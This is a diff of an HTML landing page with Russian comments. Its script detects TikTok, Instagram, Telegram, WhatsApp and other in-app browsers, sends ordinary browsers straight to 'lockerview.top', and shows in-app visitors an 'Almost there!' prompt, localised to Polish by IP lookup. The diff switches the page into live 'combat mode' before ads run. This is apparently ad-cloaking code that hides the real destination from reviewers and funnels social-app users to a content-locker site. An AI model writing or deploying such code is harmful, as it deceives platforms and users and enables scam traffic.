@@ -7,36 +7,43 @@
 
     <script>
         // =================================================================
-        // НАСТРОЙКИ (ВНИМАТЕЛЬНО ПРОЧТИТЕ)
+        // НАСТРОЙКИ
         // =================================================================
         
-        // 1. Ссылка на ваш настоящий лендинг
+        // 1. Твоя ссылка для редиректа
         const REAL_LANDING_URL = "https://lockerview.top";
 
-        // 2. РЕЖИМ ТЕСТИРОВАНИЯ
-        // Сейчас стоит true — редирект отключен, вы можете смотреть дизайн!
-        // ПЕРЕД ЗАПУСКОМ РЕКЛАМЫ ПОМЕНЯЙТЕ НА false
+        // 2. БОЕВОЙ РЕЖИМ (false = редирект включен)
         const TEST_MODE = false; 
 
         function isInAppBrowser() {
             const ua = (navigator.userAgent || navigator.vendor || window.opera).toLowerCase();
+            
+            // 1. Поиск по названиям всех популярных соцсетей и мессенджеров
             const inAppMarkers = [
                 'tiktok', 'bytedance', 'musical_ly', 
                 'snssdk', 'aweme', 'trill', 'jianying', 
                 'instagram', 'fbav', 'fban', 'fb_iab', 'vkontakte',
-                'telegram', 'tgbot' // <-- Добавили Telegram!
+                'telegram', 'tgbot', 'viber', 'whatsapp', 'messenger'
             ];
-            return inAppMarkers.some(marker => ua.includes(marker));
+            
+            const isSocialApp = inAppMarkers.some(marker => ua.includes(marker));
+
+            // 2. Универсальный отлов внутренних браузеров (WebView) 
+            // 'wv' - стандартный маркер внутреннего браузера на Android
+            const isAndroidWebView = ua.includes('wv') || (ua.includes('android') && ua.includes('version/'));
+
+            return isSocialApp || isAndroidWebView;
         }
 
-        // Защита для предпросмотра (чтобы сайт не ломался в редакторах)
+        // Защита для предпросмотра (чтобы сайт не ломался в редакторах кода)
         const isIframe = window.self !== window.top;
 
-        // Если тесты выключены И мы не во фрейме предпросмотра
+        // ЛОГИКА РЕДИРЕКТА
         if (!TEST_MODE && !isIframe) {
-            // И если это обычный браузер (не TikTok)
+            // Если это нормальный браузер (НЕ внутренний) — моментально перекидываем
             if (!isInAppBrowser()) {
-                window.location.replace(REAL_LANDING_URL); // Перекидываем на лендинг
+                window.location.replace(REAL_LANDING_URL); 
             }
         }
     </script>
@@ -139,13 +146,13 @@
 </head>
 <body>
 
-    <!-- Векторная стрелка, указывающая на меню -->
+    <!-- Векторная стрелка -->
     <svg class="arrow" viewBox="0 0 24 24" fill="none" stroke="#fe2c55" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
         <line x1="5" y1="19" x2="19" y2="5"></line>
         <polyline points="9 5 19 5 19 15"></polyline>
     </svg>
 
-    <!-- Основной контент страницы (с ID для локализации) -->
+    <!-- Основной контент (с ID для локализации) -->
     <div class="container">
         <div class="icon">🚀</div>
         <h1 id="text-title">Almost there!</h1>
@@ -176,11 +183,9 @@
 
         async function applyLocalization() {
             try {
-                // Бесплатный и быстрый API для проверки страны по IP
                 const response = await fetch('https://get.geojs.io/v1/ip/country.json');
                 const data = await response.json();
                 
-                // Если страна - Польша, подменяем текст
                 if (data.country === 'PL') {
                     document.getElementById('text-title').innerHTML = translations.pl.title;
                     document.getElementById('text-subtitle').innerHTML = translations.pl.subtitle;
@@ -188,16 +193,12 @@
                     document.getElementById('text-step2').innerHTML = translations.pl.step2;
                 }
             } catch (error) {
-                // Если API заблокирован адблоком пользователя, ничего не делаем,
-                // страница просто останется на универсальном английском языке.
-                console.log("Локализация: оставлен английский по умолчанию.");
+                console.log("Локализация: английский по умолчанию.");
             }
         }
 
-        // Запускаем локализацию сразу после загрузки структуры страницы
         document.addEventListener("DOMContentLoaded", applyLocalization);
     </script>
 
 </body>
 </html>
-
